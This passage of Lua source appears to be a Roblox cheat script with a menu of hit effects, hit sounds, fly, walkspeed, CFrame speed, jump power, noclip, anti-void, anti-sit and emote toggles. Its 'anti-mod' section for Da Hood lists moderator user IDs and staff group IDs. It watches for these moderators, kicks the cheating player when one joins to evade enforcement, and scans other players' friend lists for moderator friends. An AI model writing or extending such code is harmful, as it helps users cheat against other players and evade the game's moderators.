	blood05.Texture = 'rbxassetid://16664856199'
	blood05.FlipbookMode = Enum.ParticleFlipbookMode.OneShot
	blood05.Rotation = NumberRange.new(-360, 360)
	blood05.Enabled = false
	blood05.Parent = bloodAttachment

	local blood04 = Instance.new('ParticleEmitter')

	blood04.Name = 'Blood-04'
	blood04.LightInfluence = 1
	blood04.Lifetime = NumberRange.new(0.25, 0.5)
	blood04.SpreadAngle = Vector2.new(180, 180)
	blood04.LockedToPart = true
	blood04.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.25, 0),
		NumberSequenceKeypoint.new(1, 1),
	})
	blood04.Color = ColorSequence.new(Color3.fromRGB(100, 0, 0))
	blood04.VelocitySpread = 180
	blood04.Squash = NumberSequence.new(0, -3)
	blood04.Speed = NumberRange.new(29, 29)
	blood04.Size = NumberSequence.new(0.125, 0.6874996)
	blood04.Acceleration = Vector3.new(0, -45, 0)
	blood04.Rate = 100
	blood04.Texture = 'rbxassetid://4509687978'
	blood04.Orientation = Enum.ParticleOrientation.VelocityParallel
	blood04.Enabled = false
	blood04.Parent = bloodAttachment
    HitEffectModule.Locals.Type["Blood"] = bloodAttachment
end
local HitEffectsSettings = {
    Enabled = false,
    Type = "Blood",
    Color = Color3.fromRGB(255, 255, 255)
}
local lastHitChamsTime = {}
local lastHitEffectsTime = {}
-- Hit Chams with smooth fade out
function HitChams(Player)
    if not HitChamsSettings.Enabled then return end
    local currentTime = tick()
    if lastHitChamsTime[Player] and (currentTime - lastHitChamsTime[Player]) < 0.2 then return end
    lastHitChamsTime[Player] = currentTime
    if Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
        Player.Character.Archivable = true
        local Cloned = Player.Character:Clone()
        Cloned.Name = "HitChams_Clone_" .. Player.Name
        local bodyParts = {}
        for _, BodyPart in ipairs(Cloned:GetChildren()) do
            if BodyPart:IsA("BasePart") then
                if BodyPart.Name ~= "HumanoidRootPart" then
                    BodyPart.CanCollide = false
                    BodyPart.Anchored = true
                    BodyPart.Transparency = HitChamsSettings.Transparency
                    BodyPart.Material = HitChamsSettings.Material
                    BodyPart.Color = HitChamsSettings.Color
                    BodyPart.TopSurface = Enum.SurfaceType.Smooth
                    BodyPart.BottomSurface = Enum.SurfaceType.Smooth
                    table.insert(bodyParts, BodyPart)
                end
            elseif BodyPart:IsA("Humanoid") then
                BodyPart:Destroy()
            end
        end
        for _, Item in ipairs(Cloned:GetChildren()) do
            if not Item:IsA("BasePart") or Item.Name == "HumanoidRootPart" then
                Item:Destroy()
            end
        end
        if Cloned:FindFirstChild("Head") and Cloned.Head:FindFirstChild("face") then
            Cloned.Head.face:Destroy()
        end
        Cloned.Parent = Workspace
        -- Smooth fade out
        local duration = HitChamsSettings.Duration
        local startTransparency = HitChamsSettings.Transparency
        local startTime = tick()
        local fadeConnection
        fadeConnection = RunService.Heartbeat:Connect(function()
            local elapsed = tick() - startTime
            local alpha = math.clamp(elapsed / duration, 0, 1)
            local currentTransparency = startTransparency + (1 - startTransparency) * alpha
            if Cloned and Cloned.Parent then
                for _, part in ipairs(bodyParts) do
                    if part and part.Parent then
                        part.Transparency = currentTransparency
                    end
                end
                if alpha >= 1 then
                    fadeConnection:Disconnect()
                    Cloned:Destroy()
                end
            else
                fadeConnection:Disconnect()
            end
        end)
    end
end
-- Hit Effects with full color override from settings
function HitEffects(Player)
    if not HitEffectsSettings.Enabled then return end
    local currentTime = tick()
    if lastHitEffectsTime[Player] and (currentTime - lastHitEffectsTime[Player]) < 0.2 then return end
    lastHitEffectsTime[Player] = currentTime
    if Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
        local humanoidRootPart = Player.Character.HumanoidRootPart
        local effectTemplate = HitEffectModule.Locals.Type[HitEffectsSettings.Type]
        if not effectTemplate then return end
        local effectAttachment = effectTemplate:Clone()
        effectAttachment.Parent = humanoidRootPart
        local chosenColor = HitEffectsSettings.Color
        local emittersToCleanup = {}
        for _, emitter in pairs(effectAttachment:GetChildren()) do
            if emitter:IsA("ParticleEmitter") then
                local originalRate = emitter.Rate
                emitter.Enabled = false
                emitter.Rate = 0
                -- Override ALL emitter colors with the user-selected color (gradient: dark -> chosen -> dark)
                pcall(function()
                    emitter.Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0, Color3.new(0,0,0)),
                        ColorSequenceKeypoint.new(0.5, chosenColor),
                        ColorSequenceKeypoint.new(1, Color3.new(0,0,0))
                    })
                end)
                local emitCount = originalRate or 50
                emitter:Emit(emitCount)
                table.insert(emittersToCleanup, {
                    emitter = emitter,
                    lifetime = emitter.Lifetime.Max or 2
                })
            end
        end
        local maxLifetime = 0
        for _, emitterInfo in pairs(emittersToCleanup) do
            if emitterInfo.lifetime > maxLifetime then
                maxLifetime = emitterInfo.lifetime
            end
        end
        local cleanupDelay = math.max(maxLifetime + 0.5, 1)
        task.delay(cleanupDelay, function()
            if effectAttachment and effectAttachment.Parent then
                effectAttachment:Destroy()
            end
        end)
    end
end
local PlayerHealths = {}
local HealthConnections = {}
local CharacterConnections = {}

function disconnectPlayer(player)
    if HealthConnections[player] then
        HealthConnections[player]:Disconnect()
        HealthConnections[player] = nil
    end
    
    PlayerHealths[player] = nil
end

function trackHumanoid(player, character)
    local humanoid = character:WaitForChild("Humanoid")

    disconnectPlayer(player)

    PlayerHealths[player] = humanoid.Health

    HealthConnections[player] = humanoid.HealthChanged:Connect(function(newHealth)
        local oldHealth = PlayerHealths[player] or newHealth

        if newHealth < oldHealth and player == target then
            HitChams(player)
            HitEffects(player)
        end

        PlayerHealths[player] = newHealth
    end)
end

function watchTarget(player)
    -- Ngắt connection cũ nếu có
    if CharacterConnections[player] then
        CharacterConnections[player]:Disconnect()
    end

    -- Theo dõi respawn
    CharacterConnections[player] = player.CharacterAdded:Connect(function(character)
        if player == target then
            trackHumanoid(player, character)
        end
    end)

    -- Nếu đã có character
    if player.Character then
        trackHumanoid(player, player.Character)
    end
end

local lastTarget

RunService.Heartbeat:Connect(function()
    if target ~= lastTarget then
        if lastTarget then
            disconnectPlayer(lastTarget)
        end

        if target then
            watchTarget(target)
        end

        lastTarget = target
    end
end)

Players.PlayerRemoving:Connect(function(player)
    disconnectPlayer(player)

    if CharacterConnections[player] then
        CharacterConnections[player]:Disconnect()
        CharacterConnections[player] = nil
    end
end)
local HitSoundID = "rbxassetid://97643101798871"
local lastHealth = {}
local hitPlayed = {}

-- Hit Sounds
HitEffectsGroupBox:AddToggle('HitSoundsEnabled', {
    Text = 'Hit Sounds',
    Default = false,
})
local depboxhs = HitEffectsGroupBox:AddDependencyBox()
depboxhs:AddDropdown('HitSoundSelected', {
    Text = 'Hit Sound',
    Default = 'neverlose',
    Values = {'neverlose', 'gamesense', 'baimware', 'bubble'},
    Callback = function(Value)
        if Value == 'neverlose' then HitSoundID = 'rbxassetid://97643101798871'
        elseif Value == 'gamesense' then HitSoundID = 'rbxassetid://4817809188'
        elseif Value == 'baimware' then HitSoundID = 'rbxassetid://3124331820'
        elseif Value == 'bubble' then HitSoundID = 'rbxassetid://6534947588' end
    end,
})

depboxhs:AddSlider('HitSoundVolume', {
    Text = 'Hit Sound Volume',
    Min = 0, Max = 10, Default = 5, Rounding = 1
})
depboxhs:SetupDependencies({
	{ Toggles.HitSoundsEnabled, true } -- We can also pass `false` if we only want our features to show when the toggle is off!
})
-- Hit Notify
HitEffectsGroupBox:AddToggle('HitNotificationsEnabled', {
    Text = 'Hit Notifications',
    Default = false,
})
local depboxnotify = HitEffectsGroupBox:AddDependencyBox()
depboxnotify:AddSlider('HitNotificationsTime', {
    Text = 'Notify Time (s)',
    Min = 1, Max = 5, Default = 2, Rounding = 1,
})
depboxnotify:SetupDependencies({
	{ Toggles.HitNotificationsEnabled, true } -- We can also pass `false` if we only want our features to show when the toggle is off!
})
-- ==================== LOGIC (Heartbeat) ====================
RunService.Heartbeat:Connect(function()
    if not target or not target.Character then return end
    local humanoid = target.Character:FindFirstChild("Humanoid")
    if not humanoid then return end

    local name = target.Name

    if not lastHealth[name] then lastHealth[name] = humanoid.Health end

    -- Phát hiện hit (health giảm)
    if humanoid.Health < lastHealth[name] then
        if not hitPlayed[name] then
            -- Hit Sound
            if Toggles.HitSoundsEnabled.Value then
                local sound = Instance.new("Sound")
                sound.Parent = game:GetService("SoundService")
                sound.SoundId = HitSoundID
                sound.Volume = Options.HitSoundVolume.Value / 10
                sound:Play()
                sound.Ended:Connect(function() sound:Destroy() end)
            end

            -- Hit Notification
            if Toggles.HitNotificationsEnabled.Value then
                Library:Notify(
                    "hit: " .. target.Name .. " | health: " .. math.floor(humanoid.Health),
                    Options.HitNotificationsTime.Value
                )
            end

            hitPlayed[name] = true
        end
    else
        hitPlayed[name] = false
    end

    lastHealth[name] = humanoid.Health
end)
HitEffectsGroupBox:AddToggle('HitChamsEnabled', {
    Text = 'Hit Chams',
    Default = false,
    Callback = function(value)
        HitChamsSettings.Enabled = value
    end
}):AddColorPicker('HitChamsColor', {
    Default = Color3.fromRGB(228, 174, 174),
    Callback = function(color)
        HitChamsSettings.Color = color
    end
})
local depboxhitchams = HitEffectsGroupBox:AddDependencyBox()
depboxhitchams:AddSlider('HitChamsDuration', {
    Text = 'Hit Chams Duration',
    Default = 0.5,
    Min = 0.1,
    Max = 3.0,
    Rounding = 1,
    Callback = function(value)
        HitChamsSettings.Duration = value
    end
})
depboxhitchams:AddSlider('HitChamsTransparency', {
    Text = 'Hit Chams Transparency',
    Default = 0.3,
    Min = 0.0,
    Max = 1.0,
    Rounding = 1,
    Callback = function(value)
        HitChamsSettings.Transparency = value
    end
})
depboxhitchams:SetupDependencies({
	{ Toggles.HitChamsEnabled, true } 
})
HitEffectsGroupBox:AddToggle('HitEffectsEnabled', {
    Text = 'Hit Effects',
    Default = false,
    Callback = function(value)
        HitEffectsSettings.Enabled = value
    end
}):AddColorPicker('HitEffectColor', {
    Default = Color3.fromRGB(255, 255, 255),
    Callback = function(value)
        HitEffectsSettings.Color = value
    end
})
local depboxeffect = HitEffectsGroupBox:AddDependencyBox()
depboxeffect:AddDropdown('HitEffectType', {
    Values = {"Blood", "Crescent Slash", "Cosmic Explosion", "Slash", "Atomic Slash"},
    Default = 1,
    Multi = false,
    Text = 'Hit Effect Type',
    Callback = function(value)
        HitEffectsSettings.Type = value
    end
})
depboxeffect:SetupDependencies({
	{ Toggles.HitEffectsEnabled, true } 
})
local MovementBox = Tabs.Misc:AddLeftGroupbox("Movement")
local CharacterBox = Tabs.Misc:AddLeftGroupbox("Character")
local PlayerBox = Tabs.Misc:AddRightGroupbox("Player")
local AntiBox = Tabs.Misc:AddRightGroupbox("Anti")
local TrollingBox = Tabs.Misc:AddRightGroupbox("Troll stuff")
local lp = Players.LocalPlayer
local character = lp.Character or lp.CharacterAdded:Wait()  -- Global character

getgenv().FlightKeybind = Enum.KeyCode.X
getgenv().FlySpeed = 50
getgenv().FlightEnabled = false
getgenv().FlightKeybindEnabled = false
getgenv().Flying = false

local flyConnections = {}  
local currentCore = nil

function CreateCore()
    if workspace:FindFirstChild("Core") then 
        workspace.Core:Destroy() 
    end
    local Core = Instance.new("Part")
    Core.Name = "Core"
    Core.Size = Vector3.new(0.05, 0.05, 0.05)
    Core.CanCollide = false
    Core.Transparency = 1
    Core.Parent = workspace
    
    local Weld = Instance.new("Weld", Core)  -- Giữ Weld như bạn
    Weld.Part0 = Core
    Weld.Part1 = character:WaitForChild("HumanoidRootPart")
    Weld.C0 = CFrame.new(0, 0, 0)
    return Core
end

--// Start Fly (tối ưu: chỉ 1 conn chính, reuse)
function StartFly()
    if getgenv().Flying then return end
    getgenv().Flying = true
    
    -- Update character mới nhất
    character = lp.Character or lp.CharacterAdded:Wait()
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.PlatformStand = true
    end
    
    currentCore = CreateCore()
    
    local BV = Instance.new("BodyVelocity", currentCore)
    BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    BV.Velocity = Vector3.zero
    
    local BG = Instance.new("BodyGyro", currentCore)
    BG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    BG.P = 9e4
    BG.CFrame = currentCore.CFrame
    
    -- SINGLE CONNECTION (không lag, chỉ 1 conn)
    local conn = RunService.Heartbeat:Connect(function()
        if not getgenv().Flying or UserInputService:GetFocusedTextBox() then return end
        
        local camera = workspace.CurrentCamera
        local moveDirection = Vector3.zero
        
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDirection += camera.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDirection -= camera.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDirection -= camera.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDirection += camera.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDirection += Vector3.new(0, 1, 0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then moveDirection -= Vector3.new(0, 1, 0) end
        
        BV.Velocity = moveDirection * getgenv().FlySpeed
        BG.CFrame = camera.CFrame
    end)
    
    table.insert(flyConnections, conn)
end

function StopFly()
    getgenv().Flying = false
    for _, conn in ipairs(flyConnections) do
        conn:Disconnect()
    end
    flyConnections = {}
    
    if character and character:FindFirstChildOfClass("Humanoid") then
        character:FindFirstChildOfClass("Humanoid").PlatformStand = false
    end
    
    if workspace:FindFirstChild("Core") then
        workspace.Core:Destroy()
    end
    currentCore = nil
end

lp.CharacterAdded:Connect(function(newChar)
    character = newChar  
    task.wait(0.4)  
    
    if getgenv().FlightEnabled and getgenv().FlightKeybindEnabled then
        StartFly()
    end
end)

lp.CharacterRemoving:Connect(function()
    if getgenv().Flying then
        StopFly()
    end
end)

MovementBox:AddToggle("FlightToggle", {
    Text = "Fly (no support mobile)",
    Default = false,
    Callback = function(state)
        getgenv().FlightEnabled = state
        if not state then 
            StopFly() 
        elseif getgenv().FlightKeybindEnabled then
            StartFly()
        end
    end
}):AddKeyPicker("FlightKeybindPicker", {
    Default = "X",
    Text = "fly",
    Mode = "Toggle",
    Callback = function(state)
        if not getgenv().FlightEnabled or UserInputService:GetFocusedTextBox() then return end
        getgenv().FlightKeybindEnabled = state
        if state then
            StartFly()
        else
            StopFly()
        end
    end
})
MovementBox:AddSlider('flyspeed', {
    Text = 'Fly Speed',
    Default = FlySpeed,
    Min = 1,
    Max = 10000,
    Rounding = 1,
    Compact = true,
    Callback = function(Value)
        getgenv().FlySpeed = Value
    end
})
local walkspeedactive = false
local defaultSpeed = LocalPlayer.Character.Humanoid.WalkSpeed
local firstTime = true
LocalPlayer.CharacterAdded:Connect(function(char)
    task.wait(0.2)
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        defaultSpeed = hum.WalkSpeed
    end
end)

MovementBox:AddDropdown('speedmode', {
    Text = 'Speed Mode',
    Default = 'WalkSpeed',
    Values = {'WalkSpeed', 'CFrame'},
    Multi = false,
})
MovementBox:AddToggle('velocityactive', {
    Text = 'Walk Speed',
    Default = false,
    Callback = function(value)
        walkspeedactive = value
        local char = LocalPlayer.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        if Options.speedmode.Value == "WalkSpeed" then
	        if value and firstTime then
	            firstTime = false
	            hum.Health = 0
	        end
	        if not value then
	            hum.WalkSpeed = defaultSpeed
	        end
        end
    end
}):AddKeyPicker('keybindspeed', {
    Default = 'C',
    Text = 'keybindspeed',
    SyncToggleState = true,
})

MovementBox:AddSlider('cframespeed', {
    Text = 'CFrame Speed',
    Default = 50,
    Min = 1,
    Max = 500,
    Rounding = 0,
    Compact = true,
})

MovementBox:AddSlider('walkspeed', {
    Text = 'WalkSpeed',
    Default = 100,
    Min = 1,
    Max = 1500,
    Rounding = 0,
    Compact = true,
})
pcall(function()
local SpeedButton
MovementBox:AddToggle("SetSpeedMobileButton", {
    Text = "Speed Mobile",
    Default = false,
    Callback = function(value)
        if value then
            if not SpeedButton then
                SpeedButton = CreateButton("Speed", UDim2.new(0.5, -60, 0.6, -22), function()
                    walkspeedactive = not walkspeedactive
                    
                    local char = LocalPlayer.Character
                    if char then
                        local hum = char:FindFirstChildOfClass("Humanoid")
                        if hum then
                            if walkspeedactive then
                                if Options.speedmode.Value == "WalkSpeed" then
                                    hum.WalkSpeed = Options.walkspeed.Value
									local char = LocalPlayer.Character
									if not char then return end
									local hum = char:FindFirstChildOfClass("Humanoid")
									if not hum then return end
							
									-- Reset nhân vật bằng cách kill (health = 0)
									if value and firstTime then
										firstTime = false
										hum.Health = 0
									end
                                end
                            else
                                if Options.speedmode.Value == "WalkSpeed" then
	                                hum.WalkSpeed = defaultSpeed
                                end
                            end
                        end
                    end
                    
                    SpeedButton.Text = walkspeedactive and "Stop Speed" or "Speed"
                end)
            end
            SpeedButton.Visible = true
        else
            if SpeedButton then
                SpeedButton.Visible = false
            end
        end
    end,
})
end)
RunService.Heartbeat:Connect(function(dt)
    if walkspeedactive then
        local char = LocalPlayer.Character
        if not char then return end
        
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        
        local mode = Options.speedmode.Value
        
        if mode == "WalkSpeed" then
            hum.WalkSpeed = Options.walkspeed.Value
            
        elseif mode == "CFrame" then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                local moveDirection = hum.MoveDirection
                if moveDirection.Magnitude > 0 then
                    hrp.CFrame = hrp.CFrame + (moveDirection * dt) * Options.cframespeed.Value * 6
                end
            end
        end
    end
end)
jumppoweractive = false
DESIRED_JUMP_POWER = 100
jumpPowerConnection = nil
character = LocalPlayer.Character
humanoid = character and character:FindFirstChildOfClass("Humanoid")

MovementBox:AddToggle("jumppoweractive", {
    Text = "Jump Power",
    Default = false,
    Callback = function(value)
        jumppoweractive = value
        if jumppoweractive then
            if humanoid then
                humanoid.JumpPower = DESIRED_JUMP_POWER
                humanoid.UseJumpPower = true
            end
            jumpPowerConnection = humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
                if humanoid.JumpPower ~= DESIRED_JUMP_POWER then
                    humanoid.JumpPower = DESIRED_JUMP_POWER
                end
            end)
        else
            if jumpPowerConnection then
                jumpPowerConnection:Disconnect()
                jumpPowerConnection = nil
            end
            if humanoid then
                humanoid.JumpPower = 50  
            end
        end
    end
})

MovementBox:AddSlider('jumppowerslider', {
    Text = 'Jump Power Value',
    Default = 100,
    Min = 1,
    Max = 1000,
    Rounding = 0,
    Compact = true,
    Callback = function(value)
        DESIRED_JUMP_POWER = value
        if jumppoweractive and humanoid then
            humanoid.JumpPower = DESIRED_JUMP_POWER
        end
    end
})
do
    if isDaHood then
		local antiModEnabled, checkModFriendsEnabled, groupCheckEnabled = true, true, true
		local antiModMethod = "Kick"
		local modList = {
			163721789, 15427717, 201454243, 822999, 63794379, 17260230, 28357488,
			93101606, 8195210, 89473551, 16917269, 85989579, 1553950697, 476537893,
			155627580, 31163456, 7200829, 25717070, 201454243, 15427717, 63794379,
			16138978, 60660789, 17260230, 16138978, 1161411094, 9125623, 11319153,
			34758833, 194109750, 35616559, 1257271138, 28885841, 23558830, 25717070,
			4255947062, 29242182, 2395613299, 3314981799, 3390225662, 2459178,
			2846299656, 2967502742, 7001683347, 7312775547, 328566086, 170526279,
			99356639, 352087139, 6074834798, 2212830051, 3944434729, 5136267958,
			84570351, 542488819, 1830168970, 3950637598, 1962396833
		}
		
		local groupIDs = {10604500, 17215700}
		
		local function detectModerators()
			while antiModEnabled do
				task.wait(1)
				for _, player in ipairs(Players:GetPlayers()) do
					if table.find(modList, player.UserId) then
						local message = "⚠️ MODERATOR DETECTED: " .. player.DisplayName .. " (" .. player.Name .. ")"
						if antiModMethod == "Notify" then
							Library:Notify(message, 3)
						else
							Players.LocalPlayer:Kick("🚨 " .. message)
						end
					end
		
					if groupCheckEnabled then
						for _, groupID in ipairs(groupIDs) do
							local success, isInGroup = pcall(function() return player:IsInGroup(groupID) end)
							if success and isInGroup then
								local roleName = "Unknown Role"
								pcall(function()
									roleName = player:GetRoleInGroup(groupID)
								end)
		
								local groupMessage = "⚠️ [" .. roleName .. "] JOINED: " .. player.DisplayName .. " (" .. player.Name .. ")"
								if antiModMethod == "Notify" then
									Library:Notify(groupMessage, 3)
								else
									Players.LocalPlayer:Kick("🚨 " .. groupMessage)
								end
							end
						end
					end
				end
			end
		end
		
		local function checkFriendsWithMods()
			while checkModFriendsEnabled do
				task.wait(1)
				for _, player in ipairs(Players:GetPlayers()) do
					pcall(function()
						for _, friend in pairs(player:GetFriendsAsync():GetCurrentPage()) do
							if table.find(modList, friend.Id) then
								local friendMessage = "⚠️ " .. player.DisplayName .. " (" .. player.Name .. ") is friends with a Moderator!"
								Library:Notify(friendMessage, 4)
								break
							end
						end
					end)
				end
			end
		end
		
		local AntiModToggle = AntiBox:AddToggle("AntiModToggle", {
			Text = "Mod Detection",
			Default = true,
			Callback = function(Value)
				antiModEnabled = Value
				Library:Notify(antiModEnabled and "✅ Anti-Mod Enabled" or "⚠️ Anti-Mod Disabled", 3)
				if antiModEnabled then task.spawn(detectModerators) end
			end
		})
		
		local AntiModDepbox = AntiBox:AddDependencyBox()
		AntiModDepbox:SetupDependencies({ { AntiModToggle, true } })
		
		AntiModDepbox:AddDropdown("AntiModMethod", {
			Values = {"Notify", "Kick"},
			Default = "Kick",
			Multi = false,
			Text = "Anti-Mod Method",
			Callback = function(Value)
				antiModMethod = Value
				Library:Notify("ℹ️ Anti-Mod Method set to: " .. antiModMethod, 3)
			end
		})
		
		AntiModDepbox:AddToggle("CheckModFriends", {
			Text = "Friended Checking",
			Tooltip = "Detects if any player is friends with a Moderator",
			Default = true,
			Callback = function(Value)
				checkModFriendsEnabled = Value
				Library:Notify(checkModFriendsEnabled and "✅ Checking for Mod Friends Enabled" or "⚠️ Checking for Mod Friends Disabled", 3)
				if checkModFriendsEnabled then task.spawn(checkFriendsWithMods) end
			end
		})
		
		local GroupCheckDepbox = AntiModDepbox:AddDependencyBox()
		GroupCheckDepbox:SetupDependencies({ { AntiModToggle, true } })
		
		GroupCheckDepbox:AddToggle("GroupCheck", {
			Text = "Group Role Checking",
			Tooltip = "Detects if any player is in the restricted groups",
			Default = true,
			Callback = function(Value)
				groupCheckEnabled = Value
				Library:Notify(groupCheckEnabled and "✅ Group Membership Check Enabled" or "⚠️ Group Membership Check Disabled", 3)
				if groupCheckEnabled then task.spawn(detectModerators) end
			end
		})
	end
end
if isDahood then 
	local vanhuyhandsome = true
	AntiBox:AddToggle('AntiBag', {
		Text = 'Anti Bag',
		Default = true,
	})
	AntiBox:AddToggle('AntiFlame', {
		Text = 'Anti Flame',
		Default = true,
	})
	AntiBox:AddDropdown('antiflametargets', {
		Text = 'antiflame target',
		SpecialType = 'Player',
		Multi = true,
		Default = {},
	})
end
AntiBox:AddToggle('AntiVoid', {
    Text = 'Anti Void',
    Default = true,
    Callback = function(v)
        if v then
            workspace.FallenPartsDestroyHeight = -0 / 0
        else
            Workspace.FallenPartsDestroyHeight = -500
        end
    end,
})
workspace.FallenPartsDestroyHeight = -0 / 0

local emotes = {
    ['Floss'] = '10714340543',
    ['Rainbow Dance'] = '131275075715065',
    ['Michael Myers'] = '104253439312610',
    ['Yungblud Happier Jump'] = '15609995579',
    ['Hyper Flex'] = '10714369624',
    ['Gangnam Style'] = '131104967711844',
    ['Coffin Walkout'] = '126771729094882',
    ['Mae Stephens - Dance'] = '16553163212',
    ['Victory Dance'] = '15505456446',
    ['Elton John - Heart Skip'] = '11309255148',
    ['Sturdy Dance - Ice Spice'] = '17746180844',
    ['Meme China'] = '98943029911905',
    ['Basketball Head'] = '138243322520289',
    ['Sidekicks'] = '10370362157',
    ['Rampage'] = '139658061151500',
    ['Rambunctious'] = '85916053135662',
    ['Griddy'] = '121966805049108',
    ['Orange Justice'] = '78927657777256',
    ['Float Stylish'] = '112089880074848',
    ['Float in clouds'] = '116370641960604',
    ['billy bounce'] = '136095999219650',
    ['zero two dance v2'] = '116714406076290',
    ['jabba switchway'] = '82682811348660',
    ['beat'] = '133394554631338',
    ['take the l'] = '117865821073911',
    ['Popular'] = '93062298566806',
    ['cute feet kicking'] = '124287251935400',
}
local emoteNames = {}
for name in pairs(emotes) do
    table.insert(emoteNames, name)
end
table.sort(emoteNames)
local selectedEmote = emoteNames[1]
local emoteEnabled = false
local currentTrack = nil
local isPlaying = false
local customAnimId = ""
local emoteSpeed = 1 -- Default speed 1x

function playEmote()
    local character = Players.LocalPlayer.Character
    if not character then return end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    local animId = (selectedEmote == "Custom") and customAnimId or emotes[selectedEmote]
    if not animId or animId == "" then return end

    -- Stop animation cũ
    if currentTrack then
        currentTrack:Stop()
        currentTrack:Destroy()
        currentTrack = nil
    end

    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://" .. animId

    currentTrack = humanoid:LoadAnimation(anim)
    currentTrack:Play()
    currentTrack:AdjustSpeed(emoteSpeed) 

    isPlaying = true
end

-- Toggle Emote
CharacterBox:AddToggle('EmoteToggle', {
    Text = 'Emote',
    Default = false,
    Callback = function(value)
        emoteEnabled = value
        if not value then
            if currentTrack then
                currentTrack:Stop()
                currentTrack = nil
            end
            isPlaying = false
        else
            playEmote() 
        end
    end
}):AddKeyPicker('EmoteKeybind', {
    Default = '',
    Text = 'emote',
    Mode = 'Toggle',
    Callback = function()
        if UserInputService:GetFocusedTextBox() then return end

        emoteEnabled = not emoteEnabled

        if emoteEnabled then
            playEmote()
        else
            if currentTrack then
                currentTrack:Stop()
                currentTrack:Destroy()
                currentTrack = nil
            end
            isPlaying = false
        end
    end
})

-- Dropdown Emote
local emoteValues = {"Custom"}
for _, name in ipairs(emoteNames) do
    table.insert(emoteValues, name)
end
local depboxemote = CharacterBox:AddDependencyBox()
depboxemote:AddDropdown('EmoteSelector', {
    Values = emoteValues,
    Default = 2,
    Multi = false,
    Text = 'Select Emote',
    Callback = function(value)
        selectedEmote = value
        if currentTrack then
            currentTrack:Stop()
            currentTrack = nil
        end
        if emoteEnabled and isPlaying then
            playEmote()
        end
    end
})

-- Input Custom ID
depboxemote:AddInput('CustomAnimId', {
    Text = 'Custom Anim ID',
    Placeholder = 'eg: 20820112082011',
    Callback = function(value)
        customAnimId = value
        if selectedEmote == "Custom" and emoteEnabled and isPlaying then
            playEmote()
        end
    end
})

-- Slider Speed
depboxemote:AddSlider('EmoteSpeed', {
    Text = 'Emote Speed',
    Min = 1,
    Max = 10,
    Default = 1,
    Rounding = 0,
    Suffix = "x",
    Callback = function(value)
        emoteSpeed = value
        if currentTrack then
            currentTrack:AdjustSpeed(value) 
        end
    end
})
depboxemote:SetupDependencies({
	{ Toggles.EmoteToggle, true } 
})
LocalPlayer.CharacterAdded:Connect(function(newChar)
    if emoteEnabled then
        task.wait(1.4)
        playEmote()
    end
end)
local NoclipConnection
function toggleNoclip(bool)
    if bool then
        NoclipConnection = RunService.RenderStepped:Connect(function()
            if LocalPlayer.Character then
                for _, v in pairs(LocalPlayer.Character:GetDescendants())do
                    if v:IsA('BasePart') and v.CanCollide then
                        v.CanCollide = false
                    end
                end
            end
        end)
    else
        if NoclipConnection then
            NoclipConnection:Disconnect()
        end
    end
end
AntiBox:AddToggle('Sit', {
    Text = 'Anti Sit',
    Default = true,
    Callback = function(Value)
        if Value then
            Connections.AntiSit = RunService.RenderStepped:Connect(function()
                local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if hum and hum.Sit then hum.Sit = false end
            end)
        else
            if Connections.AntiSit then Connections.AntiSit:Disconnect() Connections.AntiSit = nil end
        end
    end
})

AntiBox:AddToggle('antislow', {
    Text = 'Anti Slow',
    Default = true,
})
AntiBox:AddToggle('nojumpcooldown', {
    Text = 'Anti jump cooldown',
    Default = true,
})
function NoJumpCooldown()
    if Toggles.nojumpcooldown.Value and LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.UseJumpPower = not hum.UseJumpPower
        end
    end
end
function AntiSlow()
    if Toggles.antislow.Value and LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.WalkSpeed = 16
        end
    end
end
RunService.Heartbeat:Connect(function()
    AntiSlow()
    NoJumpCooldown()
end)
CharacterBox:AddToggle('Noclip', {
    Text = 'Noclip',
    Default = false,
    Callback = toggleNoclip,
}):AddKeyPicker('NoclipKey', {
    Default = 'none',
    SyncToggleState = true,
    Mode = 'Toggle',
    Text = 'Noclip',
})
CharacterBox:AddToggle('antifling', {
    Text = 'Anti Fling',
    Default = false,
})
if vanhuyhandsome then 
	function hasFlame(player)
		if not player or not player.Character then return false end
		local tool = player.Character:FindFirstChildOfClass("Tool")
		return tool and tool.Name == "[Flamethrower]"
	end

	function isReloading(player)
		local be = player.Character and player.Character:FindFirstChild("BodyEffects")
		return be and be:FindFirstChild("Reload") and be.Reload.Value == true
	end

	function isThreat(player)
		if not player or not player.Character then return false end
		if player.Character:FindFirstChild("Christmas_Sock") then return false end -- đã bị bag
		if player.Character:FindFirstChildOfClass("ForceField") then return true end
		if hasFlame(player) and not isReloading(player) then return true end
		return false
	end

	function isVulnerable(player)
		if not player or not player.Character then return false end
		if player.Character:FindFirstChild("Christmas_Sock") then return false end
		if hasFlame(player) and isReloading(player) then return true end
		return false
	end
	function checkAntiBag()
		if not (Toggles and Toggles.AntiBag and Toggles.AntiBag.Value) or game.PlaceId ~= 2788229376 then
			return
		end

		local myChar = LocalPlayer.Character
